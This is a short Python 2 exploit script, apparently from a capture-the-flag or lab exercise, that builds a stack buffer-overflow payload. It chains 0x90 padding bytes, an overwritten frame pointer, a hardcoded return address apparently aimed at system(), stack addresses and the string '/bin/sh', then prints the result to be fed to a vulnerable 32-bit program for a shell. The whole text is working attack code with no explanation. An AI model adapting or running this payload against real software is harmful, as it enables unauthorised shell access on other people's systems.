nullstr = chr(0x90) + chr(0x90) + chr(0x90) + chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)+ chr(0x90)

shellpath = "/bin/sh"
ebpstr = ("\xf8\xf9\xfe\xbf")
systemretstr = ("\x30\xa0\x04\x08")
shellcodeaddr = ("\xe8\xf9\xfe\xbf")
expstr = nullstr + ebpstr + systemretstr + shellcodeaddr + shellcodeaddr + shellpath
print expstr
